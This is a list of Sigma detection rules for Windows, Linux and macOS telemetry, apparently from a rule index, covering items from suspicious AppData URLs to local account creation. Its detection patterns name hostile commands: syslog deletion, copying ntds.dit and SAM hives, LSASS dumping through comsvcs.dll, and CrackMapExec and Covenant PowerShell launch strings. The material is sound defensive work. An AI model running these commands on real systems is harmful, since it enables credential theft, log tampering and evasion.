<li><a href="#">title:Command Line Execution with Suspicious URL and AppData Strings id: 1ac8666b-046f-4201-8aba-1951aaec03a3 status: test description: Detects a suspicious command line execution that includes an URL and AppData string in the command line parameters as used by several droppers (js/vbs > powershell) author: Florian Roth, Jonhnathan Ribeiro, oscd.community references: - - date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\cmd.exe' CommandLine|contains|all: - 'http' # captures both http and https - '://' - '%AppData%' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - High level: medium tags: - attack.execution - attack.t1059.003 - attack.t1059.001 - attack.command_and_control - attack.t1105 
<li><a href="#">title:Command Line Path Traversal Evasion status: experimental id: 1327381e-6ab0-4f38-b583-4c1b8346a56b author: Christian Burkard date: 2021/10/26 modified: 2022/02/02 description: Detects the attempt to evade or obfuscate the executed command on the CommandLine using bogus path traversal references: - - tags: - attack.defense_evasion - attack.t1036 logsource: category: process_creation product: windows detection: selection1: Image|contains: '\Windows\' CommandLine|contains: - '\..\Windows\' - '\..\System32\' - '\..\..\' selection2: CommandLine|contains: '.exe\..\' filter: CommandLine|contains: '\Google\Drive\googledrivesync.exe\..\' condition: 1 of selection* and not filter falsepositives: - Google Drive level: high 
<li><a href="#">title:Commands to Clear or Remove the Syslog id: 3fcc9b35-39e4-44c0-a2ad-9e82b6902b31 status: experimental description: Detects specific commands commonly used to remove or empty the syslog. date: 2021/10/15 author: Max Altgelt, Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research), MSTIC tags: - attack.impact - attack.t1565.001 references: - logsource: product: linux category: process_creation detection: selection: CommandLine|contains: - 'rm /var/log/syslog' - 'rm -r /var/log/syslog' - 'rm -f /var/log/syslog' - 'rm -rf /var/log/syslog' - 'mv /var/log/syslog' - ' >/var/log/syslog' - ' > /var/log/syslog' condition: selection falsepositives: - Log rotation. level: high 
<li><a href="#">title:Commands to Clear or Remove the Syslog id: e09eb557-96d2-4de9-ba2d-30f712a5afd3 status: experimental description: Detects specific commands commonly used to remove or empty the syslog author: Max Altgelt date: 2021/09/10 references: - tags: - attack.impact - attack.t1565.001 logsource: product: linux detection: selection: - 'rm /var/log/syslog' - 'rm -r /var/log/syslog' - 'rm -f /var/log/syslog' - 'rm -rf /var/log/syslog' - 'mv /var/log/syslog' - ' >/var/log/syslog' - ' > /var/log/syslog' falsepositives: - '/syslog.' condition: selection and not falsepositives falsepositives: - Log rotation level: high 
<li><a href="#">title:Common Autorun Keys Modification id: f59c3faf-50f3-464b-9f4c-1b67ab512d99 related: - id: 17f878b8-9968-4578-b814-c4217fc5768c type: derived status: experimental description: Detects modification of autostart extensibility point (ASEP) in registry. author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split), wagga (name) references: - - - # a list with registry keys date: 2019/10/25 modified: 2022/04/04 logsource: category: registry_set product: windows detection: main_selection: EventType: SetValue TargetObject|contains: - '\SOFTWARE\Wow6432Node\Microsoft\Windows CE Services\AutoStart' - '\Software\Wow6432Node\Microsoft\Command Processor\Autorun' - '\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components' - '\SOFTWARE\Microsoft\Windows CE Services\AutoStartOnDisconnect' - '\SOFTWARE\Microsoft\Windows CE Services\AutoStartOnConnect' - '\SYSTEM\Setup\CmdLine' - '\Software\Microsoft\Ctf\LangBarAddin' - '\Software\Microsoft\Command Processor\Autorun' - '\SOFTWARE\Microsoft\Active Setup\Installed Components' - '\SOFTWARE\Classes\Protocols\Handler' - '\SOFTWARE\Classes\Protocols\Filter' - '\SOFTWARE\Classes\Htmlfile\Shell\Open\Command\(Default)' - '\Environment\UserInitMprLogonScript' - '\SOFTWARE\Policies\Microsoft\Windows\Control Panel\Desktop\Scrnsave.exe' - '\Software\Microsoft\Internet Explorer\UrlSearchHooks' - '\SOFTWARE\Microsoft\Internet Explorer\Desktop\Components' - '\Software\Classes\Clsid\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\Inprocserver32' - '\Control Panel\Desktop\Scrnsave.exe' filter_empty: Details: '(Empty)' filter_msoffice: - TargetObject|contains: - '\Office\ClickToRun\REGISTRY\MACHINE\Software\Classes\PROTOCOLS\Handler\' - '\ClickToRunStore\HKMU\SOFTWARE\Classes\PROTOCOLS\Handler\' - Details: - '{314111c7-a502-11d2-bbca-00c04f8ec294}' - '{3459B272-CC19-4448-86C9-DDC3B4B2FAD3}' - '{42089D2D-912D-4018-9087-2B87803E93FB}' - '{5504BE45-A83B-4808-900A-3A5C36E7F77A}' - '{807583E5-5146-11D5-A672-00B0D022E945}' filter_chrome: TargetObject|contains: '\SOFTWARE\Microsoft\Active Setup\Installed Components\{8A69D345-D564-463c-AFF1-A69D9E530F96}\' filter_edge: TargetObject|contains: '\SOFTWARE\Microsoft\Active Setup\Installed Components\{9459C573-B17A-45AE-9F64-1857B5D58CEE}\' filter_IE: TargetObject|contains: '\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}\' filter_image: Image: - 'C:\Windows\System32\poqexec.exe' - 'C:\Program Files (x86)\Microsoft Office\root\integration\integrator.exe' filter_office: Image|startswith: - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\' - 'C:\Program Files\Common Files\Microsoft Shared\ClickToRun\Updates\' Image|endswith: '\OfficeClickToRun.exe' condition: main_selection and not 1 of filter_* fields: - SecurityID - ObjectName - OldValueType - NewValueType falsepositives: - Legitimate software automatically (mostly, during installation) sets up autorun keys for legitimate reason - Legitimate administrator sets up autorun keys for legitimate reason level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Communication To Mega.nz id: fdeebdf0-9f3f-4d08-84a6-4c4d13e39fe4 status: experimental description: Detects an executable accessing mega.co.nz, which could be a sign of forbidden file sharing use of data exfiltration by malicious actors author: Florian Roth references: - - date: 2021/12/06 tags: - attack.exfiltration - attack.t1567.001 logsource: category: network_connection product: windows detection: selection: Initiated: 'true' DestinationHostname|endswith: 'api.mega.co.nz' condition: selection falsepositives: - Legitimate use of mega.nz uploaders and tools level: high 
<li><a href="#">title:COMPlus_ETWEnabled Command Line Arguments id: 41421f44-58f9-455d-838a-c398859841d4 status: test description: Potential adversaries stopping ETW providers recording loaded .NET assemblies. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - - - - - - - - date: 2020/05/02 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: 'COMPlus_ETWEnabled=0' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1562 
<li><a href="#">title:COMPlus_ETWEnabled Registry Modification id: a4c90ea1-2634-4ca0-adbb-35eae169b6fc status: test description: Potential adversaries stopping ETW providers recording loaded .NET assemblies. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - - - - - - - - date: 2020/06/05 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: 4657 ObjectName|endswith: '\SOFTWARE\Microsoft\.NETFramework' ObjectValueName: 'ETWEnabled' NewValue: '0' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:COMPlus_ETWEnabled Registry Modification id: bf4fc428-dcc3-4bbd-99fe-2422aeee2544 status: test description: Potential adversaries stopping ETW providers recording loaded .NET assemblies. author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) references: - - - - - - - - - date: 2020/06/05 modified: 2022/03/26 logsource: product: windows category: registry_set detection: selection: EventType: SetValue TargetObject|endswith: 'SOFTWARE\Microsoft\.NETFramework\ETWEnabled' Details: 'DWORD (0x00000000)' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1112 
<li><a href="#">title:Compress Data and Lock With Password for Exfiltration With 7-ZIP id: 9fbf5927-5261-4284-a71d-f681029ea574 status: experimental author: frack113 date: 2021/07/27 modified: 2021/12/02 description: An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities references: - tags: - attack.collection - attack.t1560.001 logsource: category: process_creation product: windows detection: selection_7z: CommandLine|contains: - '7z.exe' - '7za.exe' selection_password: CommandLine|contains: ' -p' selection_action: CommandLine|contains: - ' a ' - ' u ' condition: all of selection* falsepositives: - Command line parameter combinations that contain all included strings level: medium fields: - CommandLine - ParentCommandLine - CurrentDirectory 
<li><a href="#">title:Compress Data and Lock With Password for Exfiltration With WINZIP id: e2e80da2-8c66-4e00-ae3c-2eebd29f6b6d status: experimental author: frack113 date: 2021/07/27 modified: 2021/12/02 description: An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities references: - tags: - attack.collection - attack.t1560.001 logsource: category: process_creation product: windows detection: selection_winzip: CommandLine|contains: - 'winzip.exe' - 'winzip64.exe' selection_password: CommandLine|contains: '-s"' selection_other: CommandLine|contains: - ' -min ' - ' -a ' condition: all of selection* falsepositives: - Unknown level: medium 
<li><a href="#">title:Confluence Exploitation CVE-2019-3398 id: e9bc39ae-978a-4e49-91ab-5bd481fc668b status: test description: Detects the exploitation of the Confluence vulnerability described in CVE-2019-3398 author: Florian Roth references: - date: 2020/05/26 modified: 2021/11/27 logsource: category: webserver detection: selection: cs-method: 'POST' c-uri|contains|all: - '/upload.action' - 'filename=../../../../' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 
<li><a href="#">title:Conhost Parent Process Executions id: 7dc2dedd-7603-461a-bc13-15803d132355 status: experimental description: Detects the conhost execution as parent process. Can be used to evaded defense mechanism. references: - author: omkar72 date: 2020/10/25 modified: 2021/12/17 tags: - attack.defense_evasion - attack.t1202 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: '\conhost.exe' filter: Provider_Name: 'SystemTraceProvider-Process' # FPs with Aurora condition: selection and not filter fields: - Image - CommandLine - ParentCommandLine falsepositives: - Unlikely, conhost is a child less process level: medium 
<li><a href="#">title:Conhost.exe CommandLine Path Traversal id: ee5e119b-1f75-4b34-add8-3be976961e39 status: experimental description: detects the usage of path traversal in conhost.exe indicating possible command/argument confusion/hijacking author: Nasreddine Bencherchali references: - date: 2022/06/14 logsource: category: process_creation product: windows detection: selection: ParentCommandLine|contains: 'conhost' CommandLine|contains: '/../../' condition: selection falsepositives: - Unlikely level: high tags: - attack.execution - attack.t1059.003 
<li><a href="#">title:Connection Proxy id: 72f4ab3f-787d-495d-a55d-68c2ff46cf4c status: test description: Detects setting proxy author: Ã–mer GÃ¼nal references: - date: 2020/06/17 modified: 2021/11/27 logsource: product: linux detection: keywords: - 'http_proxy=*' - 'https_proxy=*' condition: keywords falsepositives: - Legitimate administration activities level: low tags: - attack.defense_evasion 
<li><a href="#">title:Conti Backup Database id: 2f47f1fd-0901-466e-a770-3b7092834a1b status: experimental author: frack113 date: 2021/08/16 modified: 2021/12/02 description: Detects a command used by conti to dump database references: - #the leak info not the files itself - - tags: - attack.collection - attack.t1005 logsource: category: process_creation product: windows detection: selection_tools: CommandLine|contains: - 'sqlcmd ' - 'sqlcmd.exe' selection_svr: CommandLine|contains: ' -S localhost ' selection_query: CommandLine|contains: - 'sys.sysprocesses' - 'master.dbo.sysdatabases' - 'BACKUP DATABASE' condition: all of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:Conti NTDS Exfiltration Command id: aa92fd02-09f2-48b0-8a93-864813fb8f41 description: Detects a command used by conti to exfiltrate NTDS author: Max Altgelt, Tobias Michalski date: 2021/08/09 status: experimental references: - - logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - '7za.exe' - '\\C$\\temp\\log.zip' condition: selection falsepositives: - Unknown level: high tags: - attack.collection - attack.t1560 
<li><a href="#">title:Conti Ransomware Execution id: 689308fc-cfba-4f72-9897-796c1dc61487 status: test author: frack113 date: 2021/10/12 description: Conti ransomware command line ioc references: - - tags: - attack.impact - attack.s0575 - attack.t1486 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - '-m ' - '-net ' - '-size ' #size 10 in references - '-nomutex ' - '-p \\' - '$' condition: selection falsepositives: - Unlikely level: critical 
<li><a href="#">title:Conti Volume Shadow Listing id: 7b30e0a7-c675-4b24-8a46-82fa67e2433d description: Detects a command used by conti to find volume shadow backups author: Max Altgelt, Tobias Michalski date: 2021/08/09 status: test references: - - logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'vssadmin list shadows' - 'log.txt' condition: selection fields: - User - CommandLine - ParentImage falsepositives: - Unknown level: high tags: - attack.t1587.001 - attack.resource_development 
<li><a href="#">title:Control Panel Items id: 0ba863e6-def5-4e50-9cea-4dd8c7dc46a4 status: test description: Detects the malicious use of a control panel item author: Kyaw Min Thein, Furkan Caliskan (@caliskanfurkan_) references: - - date: 2020/06/22 modified: 2022/05/10 logsource: product: windows category: process_creation detection: selection1: CommandLine|endswith: '.cpl' filter: CommandLine|contains: - '\System32\' - '%System%' fp1_igfx: CommandLine|contains|all: - 'regsvr32 ' - ' /s ' - 'igfxCPL.cpl' selection2: Image|endswith: '\reg.exe' CommandLine|contains: 'add' selection3: CommandLine|contains: 'CurrentVersion\Control Panel\CPLs' condition: (selection1 and not filter and not fp1_igfx) or (selection2 and selection3) falsepositives: - Unknown level: high tags: - attack.execution - attack.defense_evasion - attack.t1218.002 - attack.persistence - attack.t1546 
<li><a href="#">title:Copy from Admin Share id: 855bc8b5-2ae8-402e-a9ed-b889e6df1900 status: test description: Detects a suspicious copy command to or from an Admin share author: 'Florian Roth, oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st' references: - - date: 2019/12/30 modified: 2022/01/07 logsource: category: process_creation product: windows detection: selection1: Image|endswith: - '\robocopy.exe' - '\xcopy.exe' selection2: Image|endswith: '\cmd.exe' CommandLine|contains: 'copy' selection3: Image|contains: '\powershell' CommandLine|contains: - 'copy-item' - 'copy' - 'cpi ' - ' cp ' selection4: CommandLine|contains|all: - '\\\\' - '$' condition: (selection1 or selection2 or selection3) and selection4 fields: - CommandLine - ParentCommandLine falsepositives: - Administrative scripts level: high tags: - attack.lateral_movement - attack.collection - attack.exfiltration - attack.t1039 - attack.t1048 - attack.t1021.002 
<li><a href="#">title:Copy from Volume Shadow Copy id: c73124a7-3e89-44a3-bdc1-25fe4df754b1 description: Detects a copy execution that targets a shadow copy (sometimes used to copy registry hives that are in use) author: Max Altgelt, Tobias Michalski date: 2021/08/09 status: experimental references: - - logsource: category: process_creation product: windows detection: selection: CommandLine|contains: 'copy \\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy' condition: selection falsepositives: - Some rare backup scenarios level: medium tags: - attack.impact - attack.t1490 
<li><a href="#">title:Copying Sensitive Files with Credential Data id: e7be6119-fc37-43f0-ad4f-1f3f99be2f9f status: test description: Files with well-known filenames (sensitive files with credential data) copying author: Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community references: - - - date: 2019/10/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: - Image|endswith: '\esentutl.exe' CommandLine|contains: - 'vss' - ' /m ' - ' /y ' - CommandLine|contains: - '\windows\ntds\ntds.dit' - '\config\sam' - '\config\security' - '\config\system ' # space needed to avoid false positives with \config\systemprofile\ - '\repair\sam' - '\repair\system' - '\repair\security' - '\config\RegBack\sam' - '\config\RegBack\system' - '\config\RegBack\security' condition: selection falsepositives: - Copying sensitive files for legitimate use (eg. backup) or forensic investigation by legitimate incident responder or forensic invetigator level: high tags: - attack.credential_access - attack.t1003.002 - attack.t1003.003 - car.2013-07-001 - attack.s0404 
<li><a href="#">title:Correct Execution of Nltest.exe id: eeb66bbb-3dde-4582-815a-584aee9fe6d1 status: experimental author: Arun Chauhan date: 2021/10/04 description: The attacker might use LOLBAS nltest.exe for discovery of domain controllers, domain trusts, parent domain and the current user permissions. references: - - tags: - attack.discovery - attack.t1482 # enumerate trusted domains by using commands such as nltest /domain_trusts - attack.t1018 # enumerate remote domain controllers using options such as /dclist and /dsgetdc - attack.t1016 # enumerate the parent domain of a local machine using /parentdomain logsource: product: windows service: security detection: selection: EventID: 4689 ProcessName|endswith: nltest.exe Status: '0x0' condition: selection fields: - 'SubjectUserName' - 'SubjectDomainName' falsepositives: - Red team activity - Rare legitimate use by an administrator level: high 
<li><a href="#">title:Covenant Launcher Indicators id: c260b6db-48ba-4b4a-a76f-2f67644e99d2 status: test description: Detects suspicious command lines used in Covenant luanchers author: Florian Roth, Jonhnathan Ribeiro, oscd.community references: - date: 2020/06/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - '-Sta' - '-Nop' - '-Window' - 'Hidden' CommandLine|contains: - '-Command' - '-EncodedCommand' selection2: CommandLine|contains: - 'sv o (New-Object IO.MemorySteam);sv d ' - 'mshta file.hta' - 'GruntHTTP' - '-EncodedCommand cwB2ACAAbwAgA' condition: selection or selection2 level: high tags: - attack.execution - attack.defense_evasion - attack.t1059.001 - attack.t1564.003 
<li><a href="#">title:CrackMapExec Command Execution id: 058f4380-962d-40a5-afce-50207d36d7e2 status: stable description: Detect various execution methods of the CrackMapExec pentesting framework references: - tags: - attack.execution - attack.t1047 - attack.t1053 - attack.t1059.003 - attack.t1059.001 - attack.s0106 author: Thomas Patzke date: 2020/05/22 logsource: category: process_creation product: windows detection: selection: CommandLine|endswith: # cme/protocols/smb/wmiexec.py (generalized execute_remote and execute_fileless) - 'cmd.exe /Q /c * 1> \\\\*\\*\\* 2>&1' # cme/protocols/smb/atexec.py:109 (fileless output via share) - 'cmd.exe /C * > \\\\*\\*\\* 2>&1' # cme/protocols/smb/atexec.py:111 (fileless output via share) - 'cmd.exe /C * > *\\Temp\\* 2>&1' CommandLine|contains: # cme/helpers/powershell.py:139 (PowerShell execution with obfuscation) - 'powershell.exe -exec bypass -noni -nop -w 1 -C "' # cme/helpers/powershell.py:149 (PowerShell execution without obfuscation) - 'powershell.exe -noni -nop -w 1 -enc ' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:CrackMapExec Command Line Flags id: 42a993dd-bb3e-48c8-b372-4d6684c4106c status: experimental description: This rule detect common flag combinations used by CrackMapExec in order to detect its use even if the binary has been replaced. author: Florian Roth references: - - - - date: 2022/02/25 logsource: category: process_creation product: windows detection: selection_special: CommandLine|contains: ' -M pe_inject ' selection_execute: CommandLine|contains|all: - ' --local-auth' - ' -u ' - ' -x ' selection_hash: CommandLine|contains|all: - ' --local-auth' - ' -u ' - ' -p ' - " -H 'NTHASH'" selection_module_mssql: CommandLine|contains|all: - ' mssql ' - ' -u ' - ' -p ' - ' -M ' - ' -d ' selection_module_smb1: CommandLine|contains|all: - ' smb ' - ' -u ' - ' -H ' - ' -M ' - ' -o ' selection_module_smb2: CommandLine|contains|all: - ' smb ' - ' -u ' - ' -p ' - ' --local-auth' part_localauth_1: CommandLine|contains|all: - ' --local-auth' - ' -u ' - ' -p ' part_localauth_2: CommandLine|contains|all: - ' 10.' - ' 192.168.' - '/24 ' condition: 1 of selection* or all of part_localauth* fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: high 
<li><a href="#">title:CrackMapExec File Creation Patterns id: 9433ff9c-5d3f-4269-99f8-95fc826ea489 description: Detects suspicious file creation patterns found in logs when CrackMapExec is used status: experimental author: Florian Roth references: - date: 2022/03/12 modified: 2022/05/27 tags: - attack.credential_access - attack.t1003.001 logsource: product: windows category: file_event detection: selection_lsass_dump1: TargetFilename|startswith: 'C:\Windows\Temp\' Image: 'C:\WINDOWS\system32\rundll32.exe' User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' TargetFilename|endswith: - '.rtf' - '.otf' - '.odt' - '.txt' - '.doc' - '.pdf' - '.dll' - '.docx' - '.wpd' - '.icns' - '.db' - '.ini' - '.tex' - '.sys' - '.csv' - '.fon' - '.tar' - '.ttf' - '.xml' - '.cfg' - '.cpl' - '.jpg' - '.drv' - '.cur' - '.tmp' # list is incomplete selection_procdump: TargetFilename: 'C:\Windows\Temp\procdump.exe' User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' condition: 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:CrackMapExec PowerShell Obfuscation id: 6f8b3439-a203-45dc-a88b-abf57ea15ccf status: test description: The CrachMapExec pentesting framework implements a PowerShell obfuscation with some static strings detected by this rule. author: Thomas Patzke references: - - date: 2020/05/22 modified: 2021/11/27 logsource: category: process_creation product: windows detection: powershell_execution: CommandLine|contains: 'powershell.exe' snippets: CommandLine|contains: - 'join*split' # Line 343ff - '( $ShellId[1]+$ShellId[13]+''x'')' - '( $PSHome[*]+$PSHOME[*]+' - '( $env:Public[13]+$env:Public[5]+''x'')' - '( $env:ComSpec[4,*,25]-Join'''')' - '[1,3]+''x''-Join'''')' condition: powershell_execution and snippets fields: - ComputerName - User - CommandLine falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1027.005 
<li><a href="#">title:CrackMapExec Process Patterns id: f26307d8-14cd-47e3-a26b-4b4769f24af6 description: Detects suspicious process patterns found in logs when CrackMapExec is used status: experimental author: Florian Roth references: - date: 2022/03/12 modified: 2022/05/27 tags: - attack.credential_access - attack.t1003.001 logsource: product: windows category: process_creation detection: selection_lsass_dump1: CommandLine|contains|all: - 'cmd.exe /c ' - 'tasklist /fi ' - 'Imagename eq lsass.exe' User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' selection_lsass_dump2: CommandLine|contains|all: - 'do rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump' - '\Windows\Temp\' - ' full' - '%%B' selection_procdump: CommandLine|contains|all: - 'tasklist /v /fo csv' - 'findstr /i "lsass"' condition: 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:CrackMapExecWin id: 04d9079e-3905-4b70-ad37-6bdf11304965 status: test description: Detects CrackMapExecWin Activity as Described by NCSC author: Markus Neis references: - - date: 2018/04/08 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\crackmapexec.exe' condition: selection falsepositives: - Unknown level: critical tags: - attack.g0035 - attack.credential_access - attack.discovery - attack.t1110 - attack.t1087 
<li><a href="#">title:CrashControl CrashDump Disabled id: 2ff692c2-4594-41ec-8fcb-46587de769e0 status: experimental description: Detects disabling the CrashDump per registry (as used by HermeticWiper) author: Tobias Michalski date: 2022/02/24 modified: 2022/03/26 references: - logsource: product: windows category: registry_set detection: selection: TargetObject|contains: 'SYSTEM\CurrentControlSet\Control\CrashControl' Details: 'DWORD (0x00000000)' condition: selection falsepositives: - Legitimate disabling of crashdumps level: medium tags: - attack.t1564 - attack.t1112 
<li><a href="#">title:Create Volume Shadow Copy with Powershell id: afd12fed-b0ec-45c9-a13d-aa86625dac81 status: experimental description: Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information date: 2022/01/12 author: frack113 references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - win32_shadowcopy - ').Create(' - ClientAccessible condition: selection falsepositives: - Legitimate PowerShell scripts level: high tags: - attack.credential_access - attack.t1003.003 
<li><a href="#">title:Created Files by Microsoft Sync Center id: 409f8a98-4496-4aaa-818a-c931c0a8b832 description: This rule detects suspicious files created by Microsoft Sync Center (mobsync) references: - author: elhoim status: experimental level: medium date: 2022/04/28 modified: 2022/06/02 logsource: product: windows category: file_event detection: selection_mobsync: Image|endswith: '\mobsync.exe' filter_created_file: TargetFilename|endswith: - '.dll' - '.exe' condition: selection_mobsync and filter_created_file falsepositives: - Unknown tags: - attack.t1055 - attack.t1218 - attack.execution - attack.defense_evasion 
<li><a href="#">title:Created Files by Office Applications id: c7a74c80-ba5a-486e-9974-ab9e682bc5e4 description: This rule will monitor executable and script file creation by office applications. Please add more file extensions or magic bytes to the logic of your choice. references: - - (aka_REvil)_Ransomware.yaml author: 'Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule)' tags: - attack.t1204.002 - attack.execution status: experimental date: 2021/08/23 modified: 2022/06/02 logsource: product: windows category: file_event detection: #useful_information: Please add more file extensions to the logic of your choice. selection1: Image|endswith: - '\winword.exe' - '\excel.exe' - '\powerpnt.exe' selection2: TargetFilename|endswith: - '.exe' - '.dll' - '.ocx' - '.com' - '.ps1' - '.vbs' - '.sys' - '.bat' - '.scr' - '.proj' filter_webservicecache: # matches e.g. directory with name *.microsoft.com TargetFilename|contains|all: - 'C:\Users\' - '\AppData\Local\Microsoft\Office\' - '\WebServiceCache\AllUsers' TargetFilename|endswith: '.com' filter_webex: Image|endswith: '\winword.exe' TargetFilename|contains: '\AppData\Local\Temp\webexdelta\' TargetFilename|endswith: - '.dll' - '.exe' filter_localassembly: TargetFilename|contains: '\AppData\Local\assembly\tmp\' TargetFilename|endswith: '.dll' condition: selection1 and selection2 and not 1 of filter_* falsepositives: - Unknown level: high 
<li><a href="#">title:CreateDump Process Dump id: 515c8be5-e5df-4c5e-8f6d-a4a2f05e4b48 description: Detects uses of the createdump.exe LOLOBIN utility to dump process memory status: experimental references: - author: Florian Roth date: 2022/01/04 tags: - attack.defense_evasion - attack.t1036 - attack.t1003.001 logsource: category: process_creation product: windows detection: selection1: Image|endswith: '\createdump.exe' CommandLine|contains|all: - ' -u ' - ' -f ' selection2: CommandLine|contains|all: - ' -u -f ' - '.dmp ' condition: selection1 or selection2 falsepositives: - Command lines that use the same flags level: high 
<li><a href="#">title:CreateMiniDump Hacktool id: 36d88494-1d43-4dc0-b3fa-35c8fea0ca9d description: Detects the use of CreateMiniDump hack tool used to dump the LSASS process memory for credential extraction on the attacker's machine status: experimental author: Florian Roth references: - date: 2019/12/22 modified: 2022/03/04 tags: - attack.credential_access - attack.t1003.001 logsource: category: process_creation product: windows detection: selection1: Image|contains: '\CreateMiniDump.exe' selection2: - Imphash: '4a07f944a83e8a7c2525efa35dd30e2f' - Hashes|contains: 'IMPHASH=4a07f944a83e8a7c2525efa35dd30e2f' condition: 1 of selection* falsepositives: - Unknown level: high 
<li><a href="#">title:CreateRemoteThread API and LoadLibrary id: 052ec6f6-1adc-41e6-907a-f1c813478bee status: test description: Detects potential use of CreateRemoteThread api and LoadLibrary function to inject DLL into a process author: Roberto Rodriguez @Cyb3rWard0g references: - date: 2019/08/11 modified: 2021/11/27 logsource: product: windows category: create_remote_thread detection: selection: StartModule|endswith: '\kernel32.dll' StartFunction: 'LoadLibraryA' condition: selection falsepositives: - Unknown level: high tags: - attack.defense_evasion - attack.t1055.001 
<li><a href="#">title:Creation Exe for Service with Unquoted Path id: 8c3c76ca-8f8b-4b1d-aaf3-81aebcd367c9 status: experimental description: | Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch. author: frack113 references: - date: 2021/12/30 logsource: product: windows category: file_event detection: selection: # Feel free to add more TargetFilename: 'C:\program.exe' condition: selection falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1547.009 
<li><a href="#">title:Creation In User Word Statup Folder id: a10a2c40-2c4d-49f8-b557-1a946bc55d9d status: experimental description: Detects the creation of an file in user Word Startup author: frack113 references: - Malware Sandbox date: 2022/06/05 logsource: product: windows category: file_event detection: selection: TargetFilename|contains: '\AppData\Roaming\Microsoft\Word\STARTUP\' filter_ext: TargetFilename|endswith: - '.docx' # Word document - '.docm' # Word macro-enabled document; same as docx, but may contain macros and scripts - '.dotx' # Word template - '.dotm' # Word macro-enabled template; same as dotx, but may contain macros and scripts - '.docb' # Word binary document introduced in Microsoft Office 2007 - '.pdf' # PDF documents - '.wll' # Word add-in - '.wwl' # Word add-in condition: selection and not filter_ext falsepositives: - Addition of legitimate plugins level: medium tags: - attack.resource_development - attack.t1587.001 
<li><a href="#">title:Creation of a Diagcab id: 3d0ed417-3d94-4963-a562-4a92c940656a status: experimental description: Detects the creation of diagcab file, which could be caused by some legitimate installer or is a sign of exploitation (review the filename and its location) author: frack113 references: - date: 2022/06/08 logsource: product: windows category: file_event detection: selection: TargetFilename|endswith: '.diagcab' condition: selection falsepositives: - Legitimate microsoft diagcab level: medium tags: - attack.resource_development 
<li><a href="#">title:Creation of a Local Hidden User Account by Registry id: 460479f3-80b7-42da-9c43-2cc1d54dbccd description: Sysmon registry detection of a local hidden user account. status: experimental date: 2021/05/03 modified: 2022/06/02 author: Christian Burkard tags: - attack.persistence - attack.t1136.001 references: - logsource: product: windows category: registry_event detection: selection: TargetObject|startswith: 'HKLM\SAM\SAM\Domains\Account\Users\Names\' TargetObject|endswith: '$' Image|endswith: '\lsass.exe' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Creation Of A Local User Account id: 51719bf5-e4fd-4e44-8ba8-b830e7ac0731 status: test description: Detects the creation of a new user account. Such accounts may be used for persistence that do not require persistent remote access tools to be deployed on the system. author: Alejandro Ortuno, oscd.community references: - date: 2020/10/06 modified: 2021/11/27 logsource: category: process_creation product: macos detection: selection: Image|endswith: '/dscl' CommandLine|contains: 'create' condition: selection falsepositives: - Legitimate administration activities level: low tags: - attack.t1136.001 - attack.persistence 
